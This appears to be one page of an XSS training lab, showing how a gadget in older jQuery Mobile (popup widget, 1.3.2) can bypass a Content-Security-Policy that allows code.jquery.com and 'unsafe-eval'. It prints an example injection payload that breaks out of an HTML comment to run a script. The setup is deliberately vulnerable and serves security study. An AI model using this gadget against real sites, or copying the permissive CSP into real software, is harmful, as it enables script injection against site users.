<?php 
    header("content-security-policy: script-src 'self' https://code.jquery.com 'unsafe-eval'; object-src 'none';");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>JQuery Mobile Gadget (Popup)</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
</head>
<body>
    <h1 id="main_header">JQuery Mobile Popup Gadget</h1>
    <p>Make use of known gadgets in JQuery Mobile!</p>
    <p>Note that this only works for JQuery Mobile older than 1.3.2</p>
    <p>Your input</p>
    <p id="app"></p>
    <div id="debug"></div>

    <button id="toggle_examples">Toggle Examples</button>
    <div id="examples">
        <p>hint: You can make use of popup gadget in Jquery Mobile</p>
        <p>example: &lt;div data-role=popup id='--!&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;'&gt;&lt;/div&gt;<p>
    </div>
    <script src="../utils/show-hide.js"></script>
    <script src="./jqm-popup.js"></script>
    <script src="https://code.jquery.com/jquery-1.8.3.min.js"></script>
    <link rel="stylesheet" href="https://code.jquery.com/mobile/1.3.2/jquery.mobile-1.3.2.min.css">
    <script src="https://code.jquery.com/mobile/1.3.2/jquery.mobile-1.3.2.min.js"></script>
</body>
</html>